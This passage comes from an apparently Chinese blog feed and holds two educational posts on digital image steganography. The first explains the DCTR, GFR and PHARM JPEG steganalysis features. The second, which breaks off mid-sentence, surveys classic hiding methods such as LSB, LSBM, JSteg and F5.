(a-8,b-8)\)</span>，这个8x8的矩阵为构成为量化DCT系数的<span class="math inline">\(\mathcal{A}\)</span>块。并设定<span class="math inline">\(\mathcal{A}\)</span>块右、下、右下的8x8块分别为<span class="math inline">\(\mathcal{A}, \mathcal{B}, \mathcal{C}, \mathcal{D}\)</span>区域，则分别有四个矩阵：<span class="math inline">\(A_{k l}, B_{k 1}, C_{k l}, D_{k l}\)</span>，<span class="math inline">\((k,l)\)</span>分别表示横向和纵向的空域坐标轴的位置，由上所述可得： <span class="math display">\[u=\sum_{k=0}^{7} \sum_{l=0}^{7} Q_{k l}\left[A_{k l} R_{a, b}^{(i, j)(k, l)}+B_{k l} R_{a, b-8}^{(i, j)(k, l)}+C_{k l} R_{a-8, b}^{(i, j)(k, l)}+D_{k l} R_{a-8, b-8}^{(i, j)(k, l)}\right]\tag{4}\]</span> 由公式<span class="math inline">\((4)\)</span>我们可知<span class="math inline">\(u\)</span>在<span class="math inline">\((a,b)\)</span>的变化，不见影响<span class="math inline">\(\mathcal{A}\)</span>区域的<span class="math inline">\(8 × 8\)</span>矩阵每个像素点<span class="math inline">\((i,j)\)</span>，还会影响其他三个相邻区域的<span class="math inline">\(\mathrm{B}_{\mathrm{k} 1}, \mathrm{C}_{\mathrm{k} 1}, \mathrm{D}_{\mathrm{kl}}\)</span>三个8x8矩阵的DCT系数。由此我们可以通过两个坐标准确定位一个像素点：<span class="math inline">\((k,l)\)</span>确定了<span class="math inline">\(8 × 8\)</span>矩阵的位置，<span class="math inline">\((a,b)\)</span>确定了<span class="math inline">\(8 × 8\)</span>矩阵里元素的相对位置，因此我们可以准确定义一个二维矩阵<span class="math inline">\(\mathrm{U}_{\mathrm{a}, \mathrm{b}}^{(\mathrm{k}, 1)} \in R^{(M-8) / 8 \times(N-8) / 8}\)</span>作为<span class="math inline">\(\mathrm{U}^{(\mathrm{k}, 1)}\)</span>的子矩阵（<span class="math inline">\(\mathcal{G}_{8 \times 8}\)</span>网格中以左上角顶点为参考对象，相对坐标为<span class="math inline">\(a,b\)</span>）。由此，邻接矩阵的关系为： <span class="math display">\[\begin{split}\mathrm{U}^{(\mathrm{k}, 1)}=\bigcup_{\mathrm{a}, \mathrm{b}=0}^{7} \mathrm{U}_{\mathrm{a}, \mathrm{b}}^{(\mathrm{k}, 1)} \quad 当(a, b) \neq\left(a^{\prime}, b^{\prime}\right)时,有\mathrm{U}_{\mathrm{a}, \mathrm{b}}^{(\mathrm{k}, 1)} \cap \mathrm{U}_{\mathrm{a}^{\prime}, \mathrm{b}^{\prime}}^{(\mathrm{k}, 1)}\end{split}\tag{5}\]</span> 因此特征向量由<span class="math inline">\(0 \leq \mathrm{k}, 1 \leq 7,0 \leq \mathrm{a}, \mathrm{b} \leq 7\)</span>归一化的直方图构成： <span class="math display">\[\mathrm{h}_{\mathrm{a}, \mathrm{b}}^{(\mathrm{k} 1 \mathrm{l})}(\mathrm{r})=\frac{1}{\left|\mathrm{U}_{\mathrm{a}, \mathrm{b}}^{(\mathrm{k}, 1)}\right|} \sum_{\mathrm{u} \in \mathrm{U}_{\mathrm{a}, \mathrm{b}}^{(\mathrm{kl})}}\left[\mathrm{Q}_{\mathrm{T}}(|\mathrm{u}| / \mathrm{q})=\mathrm{r}\right]\tag{6}\]</span> 其中，<span class="math inline">\(Q_{T}\)</span>质心为<span class="math inline">\(\{0,1, \ldots, \mathrm{T}\}\)</span>的整数，实际上就是每个直方图的bins，<span class="math inline">\(q\)</span>是量化步长，<span class="math inline">\(\left[\mathrm{Q}_{\mathrm{T}}(|\mathrm{u}| / \mathrm{q})=\mathrm{r}\right]\)</span>中的<span class="math inline">\([P]\)</span>是一个判决器，当等式成立时为1，否则为0。</p>综上，DCTR算法的流程如图:<div style="text-align: center;"><figure><img src="/2019/05/29/隐写术(三)--JPEG隐写分析特征算法与理论/1559128502282.png" alt="DCTR算法的流程"><figcaption>DCTR算法的流程</figcaption></figure></div><hr><h2 id="x20-自适应二维gabor过滤器">0x20 自适应二维Gabor过滤器</h2><p>GFR全称Gabor Filter Residual[2]，这里我们把它称为二维Gabor残差过滤器。GFR能够从不同的尺度和方向准确地描述图像纹理和边缘特征，可以从丰富的图像中抽象出统计特征，以此来更有效地反映JPEG图像被嵌入秘密信息后的变化，提高数字图像隐写分析的性能。GFR利用不同尺度和方向的二维Gabor滤波器[3]对解压后的JPEG图像进行分解，然后从图像滤波系数中提取隐写分析特征。其中二维的Gabor过滤器作为本地带通滤波器在空间域和变换域具有一定的最优联合定位的特性，其能够有效地描述图像纹理和边缘特征。相比于利用64个DCT核对图像滤波的DCTR，二维Gabor过滤器可以捕获嵌入变化更多的尺度和方向，所以GFR可以更能利用自适应隐写的特性。</p><p>Gabor变换属于短时傅里叶变换（STFT），其在傅里叶变换中加入了高斯窗，实现了空间域和变换域的局部分析。当使用二维Gabor滤波器进行图像处理和分析时，首先对图像进行二维Gabor滤波器滤波，然后对其特征提取、边缘检测、去噪等处理或分析。首先，将输入的图像<span class="math inline">\(I(\mathrm{x},\mathrm{y})\)</span>与二维Gabor函数<span class="math inline">\(\mathrm{g}(\mathrm{x},\mathrm{y})\)</span>卷积，得到一个Gabor特征图<span class="math inline">\(\mathrm{u}(\mathrm{x}, \mathrm{y})\)</span>： <span class="math display">\[\mathrm{u}(\mathrm{x}, \mathrm{y})=\iint_{\Omega} \mathrm{I}(\xi, \eta) \mathrm{g}(\mathrm{x}-\xi, \mathrm{y}-\eta) \mathrm{d} \xi \mathrm{d}\tag{7}\]</span> 其中，<span class="math inline">\((\mathrm{x}, \mathrm{y}) \in \Omega\)</span>，<span class="math inline">\(\Omega\)</span>表示图像像素点集。公式<span class="math inline">\((7)\)</span>中的<span class="math inline">\(\mathrm{g}(\mathrm{x},\mathrm{y})\)</span>函数采用文献[4]的Gabor函数族，它是高斯函数和余弦函数的乘积： <span class="math display">\[\mathrm{g}_{\lambda, \theta, \phi}(\mathrm{x}, \mathrm{y})=\mathrm{e}^{-\left(\left(\mathrm{x}^{\prime} 2+\gamma^{2} \mathrm{y}^{\prime} 2\right) / 2 \sigma^{2}\right)} \cos \left(2 \pi \frac{\mathrm{x}}{\lambda}+\phi\right)\tag{8}\]</span> 其中，<span class="math inline">\(\mathrm{x}^{\prime}=\mathrm{x} \cos \theta+\mathrm{y} \sin \theta, \mathrm{y}^{\prime}=-\mathrm{x} \sin \theta+\mathrm{y} \cos \theta, \sigma=0.56 \lambda, \gamma=0.5\)</span>。σ越小，表示空间分辨率越高，图像滤波系数反应的局部属性在小尺度；反之，意味着空间分辨率越低，反映再图像的大尺度。最后，所以Gabor滤波器均中心化，其所有元素减去核均值，行成高通滤波器。</p><p>提取特征时，GFR隐写分析算法的步骤如下：</p><ul><li>步骤一：将JPEG图像解压缩到空间域，且不将像素值量化为 ，以避免信息丢失。</li><li>步骤二：将通过公式<span class="math inline">\((7)\)</span>生成不同尺度和方向的二维Gabor滤波组 ，其过程类似于DCTR过程中的公式<span class="math inline">\((3)\)</span>。</li><li>步骤三：将步骤一生成的解压后的JPEG图像与步骤二生成的每个8x8二维Gabor滤波器卷积，滤波后的图像为<span class="math inline">\(\mathbf{U}_{\mathbf{a}, \mathbf{b}}^{\boldsymbol{s}, \mathbf{l}}\)</span>，有：</li></ul><blockquote><ol type="1"><li><p>根据64个8x8的DCT块，对滤波后的图像<span class="math inline">\(\mathbf{U}^{\mathbf{S}, \mathbf{I}}\)</span>按步长为8进行子采样，得到64个子图像<span class="math inline">\(\mathbf{U}_{\mathbf{a}, \mathbf{b}}^{\boldsymbol{s}, \mathbf{l}}\)</span>；</p></li><li><p>对于每个子图像<span class="math inline">\(\mathbf{U}_{\mathbf{a}, \mathbf{b}}^{\boldsymbol{s}, \mathbf{l}}\)</span>，其直方图特征<span class="math inline">\(\mathbf{h}_{\mathbf{a}, \mathbf{b}}^{\mathbf{s . 1}}(x)\)</span>如公式<span class="math inline">\((9)\)</span>： <span class="math display">\[\mathbf{h}_{\mathbf{a}, \mathbf{b}}^{s .1}(x)=\frac{1}{\left|\mathbf{U}_{\mathbf{a}, \mathbf{b}}^{s .1}\right|} \sum_{u \in \mathbf{U}_{\mathbf{a}, b}^{s .1}}\left[Q_{T}(|u| / q)=x\right]\tag{9}\]</span></p></li></ol><p>​ 式中各项变量的说明，如公式<span class="math inline">\((6)\)</span>所说。</p><ol start="3" type="1"><li>根据文献[4]的方法，这里将64个子图像<span class="math inline">\(\mathbf{U}_{\mathbf{a}, \mathbf{b}}^{\boldsymbol{s}, \mathbf{l}}\)</span>的直方图特征全部合并，得到滤波后图像<span class="math inline">\(\mathbf{U}^{\mathbf{S}, \mathbf{I}}\)</span>的直方图特征<span class="math inline">\(\mathrm{h}^{\mathrm{S}, 1}\)</span>。</li></ol></blockquote><ul><li>步骤四：对具有相同参数σ的二维Gabor过滤器过滤后生成的图像，其相应的直方图特征进行对称合并，这一点也与DCTR相似。例如，假设方向参数<span class="math inline">\(\theta=\{0, \pi / 8,2 \pi / 8, \cdots, 6 \pi / 8,7 \pi / 8\}\)</span>，生成的滤波图像的直方图特征<span class="math inline">\(\theta=\pi / 8,7 \pi / 8\)</span>和<span class="math inline">\(\theta=2 \pi / 8,6 \pi / 8\)</span>两两合并。</li></ul>综上，GFR的过程与DCTR过程最大区别在于选取的64个卷积核不一样，GFR更能代表图像的整体纹理特征，其步骤如下图:<div style="text-align: center;"><figure><img src="/2019/05/29/隐写术(三)--JPEG隐写分析特征算法与理论/1559130220786.png" alt="GFR算法流程"><figcaption>GFR算法流程</figcaption></figure></div><hr><h2 id="x30-相位感知投影模型">0x30 相位感知投影模型</h2><p>​ 相位感知投影模型（PHARM）[5]使用基于小内核的像素预测器来避免混合具有不同系谱的随机变量，该方法没有是用大量的像素预测器来实现特征的多样化，而是使用了少量的Small-Support线性像素预测器，并采用了与投影空间富模型（PSRM）类似的方式来实现模型的多样化。下面会粗略介绍一下SRM[6]和PSRM[7]来引出PHARM。</p><p>​ 假定两个符号<span class="math inline">\(\mathrm{X}, \mathrm{Y} \in\{0, \ldots, 255\}^{\mathrm{n}_{1} \times \mathrm{n}_{2}}\)</span>，分别表示<span class="math inline">\(n_{1} \times n_{2}\)</span>维的灰度Cover图像和灰度Stego载体图像中的二维像素值数组，<span class="math inline">\(n_1,n_2\)</span>均为8的倍数。无论是SRM还是PSRM都是从45个不同的像素预测器估计给定图像的噪声成分开始的。像素预测器分两种类型：线性和非线性。每个线性预测器都是一个由核矩阵<span class="math inline">\(K\)</span>描述的移不变有限脉冲响应线性滤波器。通过将预测图像从原始图像中减去，得到噪声残差<span class="math inline">\(\mathrm{Z}=\left(\mathrm{z}_{\mathrm{k} \mathrm{l}}\right)\)</span>，（<span class="math inline">\(\mathrm{k},\mathrm{l}\)</span>在接下来的公式中表示一个<span class="math inline">\(n_{1} \times n_{2}\)</span>矩阵的索引）它是一个与<span class="math inline">\(X\)</span>的维数相同的矩阵: <span class="math display">\[\mathrm{Z}=\mathrm{K} * \mathrm{X}-\mathrm{X}\tag{10}\]</span> 由此，我们得到了基本的噪声残差<span class="math inline">\(Z\)</span>，其中“<span class="math inline">\(*\)</span>”表示<span class="math inline">\(K\)</span>和<span class="math inline">\(X\)</span> 镜面填充卷积，使得这两个矩阵卷积后的维数保持不变。 举一个最简单的线性残差的例子：$ <em>{}=</em>{, +1}-_{, } <span class="math inline">\(表示邻接横向残差，其预测器\)</span>K = (0   1)$，则表示将像素值估算为水平相邻的像素值。</p><p>​ SRM中的非线性预测器通过取两个或两个以上的残差的最小值或最大值来得到的。例如，分别对<span class="math inline">\(X_{i,j}\)</span>像素在水平和垂直方向上预测，得到水平和垂直方向上的残差<span class="math inline">\(\mathbf{Z}^{h}=\left(\mathrm{z}_{\mathrm{kl}}^{(\mathrm{h})}\right), \mathbf{Z}^{(v)}=\left(\mathrm{z}_{\mathrm{kl}}^{(\mathrm{v})}\right)\)</span>: <span class="math display">\[\begin{aligned} \mathrm{z}_{\mathrm{kl}}^{(\mathrm{h})} &amp;=\mathrm{x}_{\mathrm{k}, \mathrm{l}+1}-\mathrm{x}_{\mathrm{kl}} \\ \mathrm{z}_{\mathrm{kl}}^{(\mathrm{v})} &amp;=\mathrm{x}_{\mathrm{k}+1,\mathrm{l}}-\mathrm{x}_{\mathrm{kl}} \end{aligned}\tag{11}\]</span> 则非线性的最值残差如下： <span class="math display">\[\begin{aligned} \mathrm{z}_{\mathrm{kl}}^{(\mathrm{min})} &amp;=\min \left\{\mathrm{z}_{\mathrm{kl}}^{(\mathrm{h})}, \mathrm{z}_{\mathrm{kl}}^{(\mathrm{v})}\right\} \\ \mathrm{z}_{\mathrm{kl}}^{(\mathrm{max})} &amp;=\max \left\{\mathrm{z}_{\mathrm{kl}}^{(\mathrm{h})}, \mathrm{z}_{\mathrm{kl}}^{(\mathrm{v})}\right\} \end{aligned}\tag{12}\]</span> 与SRM通过四个方向来捕获残差的统计特性不同的是，PSRMQ3是用残差投影到多个随机方向的一阶统计量。给定噪声残差<span class="math inline">\(Z\)</span>，这里直接列出量化值的直方图函数[3]： <span class="math display">\[\begin{aligned}\mathrm{h}_{\mathrm{j}}^{(\mathrm{i})}&amp;=\left|\left\{(\mathrm{k}, 1)| | \mathrm{p}_{\mathrm{kl}}^{(\mathrm{i})} |=\mathrm{j}+1 / 2\right\}\right|, \mathrm{j} \in\{0,1, \ldots, \mathrm{T}-1\}, \mathrm{i} \in\{1, \ldots, v\}, 线性极差\\\mathrm{h}_{\mathrm{j}}^{(\mathrm{i})}&amp;=\left|\left\{(\mathrm{k}, 1) | \mathrm{p}_{\mathrm{kl}}^{(\mathrm{i})}=\mathrm{j}+1 / 2\right\}\right|, \mathrm{j} \in\{-\mathrm{T}, \ldots, \mathrm{T}-1\}, \mathrm{i} \in\{1, \ldots, \mathrm{v}\}, 非线性极差\end{aligned}\tag{13}\]</span> 其中，<span class="math inline">\(\mathrm{p}_{\mathrm{kl}}^{(\mathrm{i})} \leftarrow \mathrm{Q}_{\mathrm{T}}\left(\mathrm{p}_{\mathrm{kl}}^{(\mathrm{i})} / \mathrm{q}\right)\)</span>，而<span class="math inline">\(p_{k l}^{(i)}=\mathrm{P}^{(\mathrm{i})} \triangleq \mathrm{Z} * \Pi^{(\mathrm{i})}\)</span>，<span class="math inline">\(\boldsymbol{\Pi}^{(\mathrm{i})}\)</span>是随机矩阵：<span class="math inline">\(\Pi^{(\mathrm{i})} \in \mathrm{R}^{\mathrm{r\times s}}, \mathrm{i} \in\{1, \ldots, v\}\)</span> 。</p><p>​ 在PHARM中，仅使用线性（“spam”类）残差和以下7个内核： <span class="math display">\[\left(\begin{matrix}-1&amp;1\\\end{matrix}\right)\ \ \ \left(\begin{matrix}-1\\1\\\end{matrix}\right)\ \ \ \left(\begin{matrix}1&amp;-3&amp;3&amp;-1\\\end{matrix}\right)\ \ \ \left(\begin{matrix}1\\-3\\3\\-1\\\end{matrix}\right)\ \ \ \left(\begin{matrix}1&amp;1\\-1&amp;-1\\\end{matrix}\right)\ \ \ \left(\begin{matrix}-1&amp;1\\-1&amp;1\\\end{matrix}\right)\ \ \ \left(\begin{matrix}1&amp;-1\\-1&amp;1\\\end{matrix}\right)\]</span> ​ 这些核使用贪心正向特征选择算法获得最佳互补核，该算法使用下面列出的25个预测核的检测误差的OOB（Out-of-bag）估计，其中下面列出的第一、第二和第三阶内核使用的预测器与面向相应方向的SRM中使用的预测器相同：</p><ul><li>1 x 2一阶的水平、垂直、主次对角线（4个预测核）；</li><li>1 x 3二阶的水平、垂直、主次对角线（4个预测核）；</li><li>1 x 4三阶的水平、垂直、主次对角线（4个预测核）；</li><li>2 x 2水平 、垂直 、对角线 （主次对角线相同）（3个预测核）；</li><li>3 x 3核和它的4个EDGE（2 x 3）版本的核，如SRM（5个预测核）；</li><li>5 x 5在SRM中用在SQUARE子模型的核，以及它的4个EDGE（3x5）版本的核（5个预测核）</li></ul><p>​ 上面6种类型的预测核不需要都使用，在后续提取JPEG图像的PHARM特征时，使用了一阶、二阶和<span class="math inline">\(2 \times 2\)</span>核。</p><hr><h2 id="x40-总结">0x40 总结</h2><p>本章详细介绍了DCTR、GFR、PHARM三种隐写分析算法的原理和具体步骤.</p><hr><h2 id="x50-参考文献">0x50 参考文献</h2><blockquote><p>[1] Holub V , Fridrich J . Low-Complexity Features for JPEG Steganalysis Using Undecimated DCT[J]. IEEE Transactions on Information Forensics and Security, 2015, 10(2):219-228.</p><p>[2] Song X , Liu F , Yang C , et al. Steganalysis of Adaptive JPEG Steganography Using 2D Gabor Filters[C]// the 3rd ACM Workshop. ACM, 2015</p><p>[3] augman J G . Uncertainty relation for resolution in space, spatial frequency, and orientation optimized by two-dimensional visual cortical filters[J]. Journal of the Optical Society of America. A, Optics and image science, 1985, 2(7):1160-1169.</p><p>[4] Grigorescu S E , Petkov N , Kruizinga P . Comparison of texture features based on Gabor filters.[J]. IEEE Transactions on Image Processing A Publication of the IEEE Signal Processing Society, 2002, 11(10):1160-7.</p><p>[5] Alattar A M , Memon N D , Heitzenrater C D , et al. SPIE Proceedings [SPIE IS&amp;T/SPIE Electronic Imaging - San Francisco, California, United States (Sunday 8 February 2015)] Media Watermarking, Security, and Forensics 2015 - Phase-aware projection model for steganalysis of JPEG images[J]. Proceedings of SPIE - The International Society for Optical Engineering, 2015, 9409:94090T.</p><p>[6] Fridrich J , Kodovsky J . Rich Models for Steganalysis of Digital Images[J]. IEEE Transactions on Information Forensics and Security, 2012, 7(3):868---882.</p><p>[7] Fridrich J . Statistically undetectable jpeg steganography:dead ends challenges, and opportunities[C]// Workshop on Multimedia &amp; Security. DBLP, 2007.</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;x00-前言&quot;&gt;0x00 前言&lt;/h2&gt;
&lt;blockquote&gt;
前面介绍的内容着重于阐述传统的数字图像隐写算法，实际上与图像隐写对立的数字图像隐写分析，而这一方向也随着图像隐写的发展而发展，形成一种对抗的博弈。数字图像隐写分析分类如下图所示:&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://www.killshadow.xyz/tags/CTF/"/>
    
      <category term="MISC" scheme="http://www.killshadow.xyz/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>隐写术(二)--传统数字图像隐写算法</title>
    <link href="http://www.killshadow.xyz/2019/05/29/%E9%9A%90%E5%86%99%E6%9C%AF(%E4%BA%8C)--%E4%BC%A0%E7%BB%9F%E6%95%B0%E5%AD%97%E5%9B%BE%E5%83%8F%E9%9A%90%E5%86%99%E7%AE%97%E6%B3%95/"/>
    <id>http://www.killshadow.xyz/2019/05/29/隐写术(二)--传统数字图像隐写算法/</id>
    <published>2019-05-29T04:05:00.000Z</published>
    <updated>2019-05-29T13:24:07.147Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>数字图像隐写算法根据不同的标准而有不同的分类。下面重要根据隐写算法的工作域和隐写算法的适用范围来展开数字图像隐写算法的介绍。<a id="more"></a></p></blockquote><hr><h2 id="x10-基于空间域的隐写算法">0x10 基于空间域的隐写算法</h2><h3 id="x11-基于lsb方法的隐写算法">0x11 基于LSB方法的隐写算法</h3>LSB（Least Significant Bit），最低有效位，该算法的基本原理是将载体图像的LSB篡改为信息者想要发送的秘密信息的二进制位。LSB隐写算法是一种简单且高效的信息隐藏技术。对于PNG或者BMP图像，一般是由RGB三原色（红绿蓝）组成，每种颜色占用8bit即一个字节的空间，每个像素的像素值范围为 <code>0x00~0xFF</code>，对于彩色图来说，总共有 <span class="math inline">\(256^3\)</span>种颜色。所以如果用LSB方法隐藏信息，每个像素可以隐藏3Bit的信息。LSB隐写通过修改RGB颜色分量的最低二进制位（LSB），即使图像像素当中最不重要的那一位发生改变也无法使肉眼察觉出来。一般的载体位平面图像如图：<div style="text-align: center;"><figure><img src="/2019/05/29/隐写术(二)--传统数字图像隐写算法/8343187-2cd3356926d9d9e8.png" alt="LSB原理示意图"><figcaption>LSB原理示意图</figcaption></figure></div>LSB平面的最低位在一个像素中如图：<div style="text-align: center;"><figure><img src="/2019/05/29/隐写术(二)--传统数字图像隐写算法/8343187-59e0417e3e8c6517.png" alt="LSB和位平面"><figcaption>LSB和位平面</figcaption></figure></div>上面右边的0即为LSB，每个像素的LSB组成LSB面，我们可以在这个面嵌入信息而难以引起隐写分析的注意。下图是关于水果BMP照片的各个位平面之间的对比图：<div style="text-align: center;"><figure><img src="/2019/05/29/隐写术(二)--传统数字图像隐写算法/8343187-3910e7c974727711.png" alt="灰度图像8个位平面的二值图"><figcaption>灰度图像8个位平面的二值图</figcaption></figure></div>假设我们需要嵌入3bit的秘密消息，则如下图：<div style="text-align: center;"><figure><img src="/2019/05/29/隐写术(二)--传统数字图像隐写算法/8343187-1195edebf489b7f7.png" alt="秘密信息替换载体图像的LSB成为载密图像"><figcaption>秘密信息替换载体图像的LSB成为载密图像</figcaption></figure></div><p>对于嵌入过程可分为三个步骤：</p><ul><li>步骤一：在Cover中由给定的密钥（Key）来挑选嵌入的像素数量 Length(message)；</li><li>步骤二：对于经过步骤一确定的像素数量和给定的二进制格式的秘密信息，比较这些点的最不重要位（LSB）是否与待嵌入的二进制格式的秘密信息相同，如果相同，则不更改最不重要位（LSB）；否则，执行步骤三；</li><li>步骤三：用二进制格式的秘密信息替换掉选定像素点的最不重要位（LSB），而该像素点除了LSB的其他二进制位保持不变，则修改成为Stego。</li></ul><p>对于提取过程，根据密钥（Key）找到Stego中嵌入密码信息的像素位置，随后抽出这些像素灰度值的LSB，排列后组成秘密信息，最后将这些二进制信息转成ASCII码或Uni11code码等其他编码格式的文本或者其他多媒体格式。</p>在上述嵌入秘密信息的步骤三中，有一个重要环节是选择嵌入秘密信息的像素位置，通常有两种方法可以实现——随机间隔和连续嵌入法，如下两图所示：<div style="text-align: center;"><figure><img src="/2019/05/29/隐写术(二)--传统数字图像隐写算法/8343187-50504f197a39e8f0.png" alt="连续嵌入法"><figcaption>连续嵌入法</figcaption></figure></div><div style="text-align: center;"><figure><img src="/2019/05/29/隐写术(二)--传统数字图像隐写算法/8343187-c9d41c4241fd9b27.png" alt="随机间隔法"><figcaption>随机间隔法</figcaption></figure></div><p>LSB是较为早期的隐写算法，该方法原理简单、嵌入容量大、嵌入成本低，但是会导致灰度值在<code>2i</code>和<code>2i+1</code>的像素趋于一致，因此出现了“值对”效应。基于这种易于被统计的现象，隐写分析者设计出差分直方图检测法[1]、RS检测法[2]、<span class="math inline">\(x^2\)</span>检测法[3]。</p><h3 id="x12-lsbm隐写算法">0x12 LSBM隐写算法</h3><p>“值对”现象的出现，极大地降低了隐写系统的安全性，数字图像隐写的研究者们竭力在寻找能够修改甚至替代LSB的算法，只为消除其“值对”现象。LSBM算法便是在此背景下被Toby Sharp提出。该算法只是在LSB的基础上做了细微的“优化”来避免“值对”现象，在嵌入秘密信息的时候，如果载体图像被选定的、待嵌入的像素点的LSB与二进制形式的秘密信息不同，则对该LSB任意地<code>+1</code>或者<code>-1</code>（必须保证其随机性，以防止攻击者的“值对”分析）。此外，研究者还将加减复读进行了扩展，假设欲加减的正整数为 <code>K</code>，在这里<code>K</code>有两种情况，一种是当<span class="math inline">\(K\in奇数\)</span>的时候，使待嵌入的秘密信息二进制形式对应的比特位与数字图像待嵌入点的像素值的LSB保持一致。另一种则是当<span class="math inline">\(K\in偶数\)</span>时，数字图像待嵌入点的像素值LSB的前一位和秘密信息保持一致。这种方法有效地避免了在2i和2i+1之间的值对现象，能够绕过<span class="math inline">\(x^2\)</span>检测方法和RS检测方法。基于LSBM隐写算法还出现了其他改进算法提高嵌入效率、增强隐写算法的安全性如：LSBMR（LSBM Revisited）[4]算法和G-LSBM（Generalization of LSBM）[5]算法等。此外，还出现了最低多位替换算法MLSB（Multi LSB）算法。及其改进算法IMLSB（Independent MLSB）和TMLSB（Truss MLSB）。IMLSB算法根据密钥选取图像的最低多个平面上的比特位，并将其替换为秘密信息。该方法对各个位平面的影响是独立的，因此简称为IMLSB替换隐写；TMLSB算法根据密钥选取图像像素，然后将所选像素的最低多位看做一个整体，替换为秘密信息，因此简称为TMLSB替换隐写。</p><h3 id="x13-随机调制隐写算法">0x13 随机调制隐写算法</h3>随机调制隐写算法[6]基本思想是将欲嵌入信息调制成具有特定概率分布的噪声，并用调制后的信号替代图像获取设备带来的噪声（如高斯白噪声），使攻击者无法区分这些噪声是由图像获取设备产生的还是由隐写所引起的。首先，定义奇偶函数（Parity Function）：<center><img src="/2019/05/29/隐写术(二)--传统数字图像隐写算法/公式1.png" title="fig:" alt="公式1"></center><p>其中<span class="math inline">\(x∈{0≤i≤255}\)</span>, i是整数, s取所有整数，且s不等于0，则对某个固定的s，可以任意定义<span class="math inline">\(f(x, s)\)</span>的前2s个值，然后推知2s+1以后的所有函数值。</p><p>早期的噪声随机调制算法有Marvel等人提出来的SSIS（Spread Spectrum Image Steganography）[7]算法。该算法将秘密信息经过调制后跟载体图像叠加以实现信息隐藏；提取时，需要根据载密图像的数据推测载体图像，将载密图像和载体图像的差值（也就是噪声值）通过解调解析出秘密信息。此外，该方法还引入了纠错码技术，以提高秘密信息的准确率。</p><h3 id="x14-有限调色板图像隐写术">0x14 有限调色板图像隐写术</h3><p>图像处理中为了节省表示图像RGB信息的空间用调色板存储彩色信息（RGB值），数据区只存储当前像素的色彩在调色板中的位置，这样就省了很多字节。不过真彩色的图像没有调色板。利用调色板数据进行隐藏，其基本思想是用秘密信息比特替换调色板的颜色向量的LSB。在实际图像数据中进行LSB的替换。此类隐写首先需要对调色板进行排序，排序后调色板中相邻颜色在感官上是接近的。用调色板的排序方式对信息进行编码。因为有N!种不同的方式对调色板进行排序，所以可以用来对一个短信息进行编码。保持调色板的颜色不变，数目扩大一倍，因此图像中的每一个颜色值对应两个调色板索引，根据秘密信息比特，选择两个相同颜色中的一个。基于调色板的信息隐藏，其鲁棒性都较差，攻击者只要对调色板重新排序、或者对图像的格式进行变换，就很有可能破坏秘密信息。</p><h2 id="x20-基于变换域的隐写算法">0x20 基于变换域的隐写算法</h2>LSB及其变形是空域算法，虽然嵌入、提取容易，但是鲁棒性差、安全性低，易于造成隐藏信息的损失或被攻击者发现隐藏信息。随着互联网技术不断发展，JPEG[8]（Joint Photographic Experts Group，联合图像专家小组）图像由于其优秀的压缩能力也在网络中大量传输，而JPEG图像编码算法公开获得了很多隐写研究者的青睐。由此，数字图像隐写研究者考虑从变换域中嵌入信息。由于JPEG图像格式采用的是有损压缩技术，通过不同的质量因子，图像显示的效果会有所不同，因而使得攻击者难以辨别图像中的异常是嵌入的隐藏信息还是因为有损压缩导致的噪点。对于JPEG图像的生成过程，如图所示：<div style="text-align: center;"><figure><img src="/2019/05/29/隐写术(二)--传统数字图像隐写算法/8343187-32a945f431350912.png" alt="JPEG压缩算法流程图"><figcaption>JPEG压缩算法流程图</figcaption></figure></div><p>其中最重要的有四个步骤：夜色模式转换/采样、DCT、量化、编码。DCT（Discrete Cosine Transform，离散余弦变换）是码率压缩中常用的一种变换编码方法。DCT过程是隐写研究者着重研究的内容，在DCT变换的系数上隐写是常见的隐写方法，也是众多隐写方法的着手点。</p><h3 id="x21-jsteg隐写算法">0x21 JSteg隐写算法</h3>JSteg是最早用于JPEG隐写的隐写算法，其核心思想就是将空域的LSB隐写应用到JPEG图像的DCT变换过程中。具体来说，就是将二进制的隐藏信息嵌入到DCT系数的LSB上，如果隐藏信息的二进制数与DCT的LSB相对应的二进制数相同则不替换，否则替换成隐藏信息的二进制数。如图所示。<div style="text-align: center;"><figure><img src="/2019/05/29/隐写术(二)--传统数字图像隐写算法/8343187-dcd875e2fb0d97d1.png" alt="JPEG的DCT系数LSB替换"><figcaption>JPEG的DCT系数LSB替换</figcaption></figure></div>JSteg隐写算法整体流程如下图：<div style="text-align: center;"><figure><img src="/2019/05/29/隐写术(二)--传统数字图像隐写算法/8343187-3c316505cfd6906d.png" alt="JSteg隐写算法的流程"><figcaption>JSteg隐写算法的流程</figcaption></figure></div><p>虽然JSteg算法简单、高效，但是同样或出现“值对”效应，很容易被直方图统计攻击，因此在卡方攻击面前无所遁形。JPEG图像由于其算法特性具有两个标志性统计特征分别是：分块效应和直方图特性，因此大部分隐写分析算法利用这两个统计特性进行攻击。通用的JSteg检测方法有：基于小波特征函数统计矩阵的隐写分析方法、基于支持向量机的多特征盲检测算法等。基于小波特征函数统计矩阵的隐写分析方法将小波子带特征函数的统计矩阵作为隐写分析的特征；基于支持向量机的多特征盲检测算法则利用分块效应，将载密图像解压到空域后，裁剪图像然后冲压缩得到校准图像，最后得出特征函数。</p><h3 id="x22-f5隐写算法">0x22 F5隐写算法</h3><p>在F5隐写算法[9]出现之前，还出现过其前身F3、F4[9]隐写算法。F3隐写算法解决了JSteg隐写算法的DCT系数直方图的“值对”现象。与LSBM隐写算法类似，F3算法在非零DCT系数上的LSB嵌入信息，如果秘密信息的比特位与对应DCT系数的LSB比特位的值相同，则不变，否则对该DCT系数的LSB<code>±1</code>。F3算法成功抵抗了卡方攻击和RS攻击，提高了变换域隐写的安全性，但是该算法仍能通过直方图统计的方法找到其特征，因此无法有效避免统计攻击。由此研究者提出了F4隐写算法，优化了嵌入秘密信息后的DCT系数奇偶正负的特性，使得嵌入信息后的DCT系数一阶统计特性保持不变。而F5隐写算法的统计系数直方图会向中间靠拢，由此无法抵抗直方图攻击，由此Fridrich提出了nsF5隐写算法[10]（no-shrinkage F5），该算法利用湿纸编码算法消除了直方图收缩效应，该算法时JSteg系列算法中较为安全的算法，可以被用来测试盲检测算法的性能。</p><h3 id="x23-outguess隐写算法">0x23 OutGuess隐写算法</h3><p>OutGuess隐写算法[11]是由Niels Provos提出的为了解决JP 